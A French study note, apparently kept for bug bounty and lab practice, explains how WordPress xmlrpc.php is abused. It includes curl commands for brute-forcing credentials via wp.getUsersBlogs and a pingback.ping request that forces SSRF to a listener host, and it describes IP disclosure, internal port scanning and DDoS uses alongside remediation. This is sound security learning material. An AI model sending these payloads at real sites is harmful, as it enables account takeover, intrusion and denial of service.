# 🧩 WordPress — `xmlrpc.php`

Lié : [[02 - Fondamentaux]] · [[12 - SSRF]]

---

## Principe

`xmlrpc.php` est une **fonctionnalité légitime** de WordPress (interface XML-RPC pour trafic inter-blogs, apps mobiles). **Ce n'est PAS une vulnérabilité en soi.** Mais selon les **méthodes exposées**, elle devient un puissant levier : brute-force sans rate limit, SSRF, amplification.

> 🔑 Réflexe bug bounty : sur **toute** cible WordPress, tester `/xmlrpc.php` + `system.listMethods` dès la reco.

Détection triviale :
```bash
curl -s http://blog.cible.com/xmlrpc.php   # répond → présent
```

---

## Reco : lister les méthodes disponibles

```bash
curl -s -X POST -d "<methodCall><methodName>system.listMethods</methodName></methodCall>" \
     http://blog.cible.com/xmlrpc.php
```
Méthodes juteuses à repérer : `wp.getUsersBlogs` (brute), `pingback.ping` (SSRF), `system.multicall` (amplification), `wp.getUsers`.

---

## Attaque 1 — Brute-force d'authentification

`wp.getUsersBlogs` prend `username` + `password` :
```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params>\
<param><value>admin</value></param>\
<param><value>MOTDEPASSE</value></param></params></methodCall>" \
http://blog.cible.com/xmlrpc.php
```
- **Bon mdp** → infos du blog (`isAdmin`, `blogName`...).
- **Mauvais** → `faultCode 403` "Incorrect username or password."

### Pourquoi c'est si puissant
- **Pas de rate limit** ni CAPTCHA comme sur `/wp-login.php`.
- **`system.multicall`** permet de tester **des centaines de mdp en 1 seule requête HTTP** → contourne tout ralentissement basé sur le nombre de requêtes. Dévastateur.

---

## Attaque 2 — `pingback.ping` (SSRF déguisée)

Force le serveur WP à émettre une requête sortante vers une cible que **tu** choisis :
```http
POST /xmlrpc.php HTTP/1.1
Host: blog.cible.com

<methodCall><methodName>pingback.ping</methodName><params>
<param><value><string>http://TON-VPS.com/</string></value></param>
<param><value><string>https://blog.cible.com/2015/10/un-article/</string></value></param>
</params></methodCall>
```
- Param 1 : **où** le serveur envoie le pingback (ton listener).
- Param 2 : un **article valide** du blog (requis pour que le pingback soit accepté).

Trois exploitations :
1. **IP Disclosure** — cible derrière Cloudflare ? Le pingback arrive **directement** depuis la vraie IP → le masquage saute. (`nc -lvnp 80` ou logs de ton VPS.)
2. **XSPA** — pointe vers `127.0.0.1:<port>` ou hôtes internes ; les **différences de temps/réponse** révèlent les ports ouverts (scan interne). Cf. [[12 - SSRF]].
3. **DDoS** — appelle `pingback.ping` sur des milliers de blogs WP, tous pointés vers une même victime.

> ⚠️ En lab HTB, `pingback.ping` est souvent inexploitable à cause de **restrictions d'egress** (sorties réseau bloquées).

---

## Remédiation

- Désactiver `xmlrpc.php` si inutilisé (plugin ou règle serveur).
- Désactiver spécifiquement `pingback.ping` et `system.multicall`.
- Rate limiting / MFA sur l'authentification.

Tags : #wordpress #xmlrpc #bruteforce #ssrf
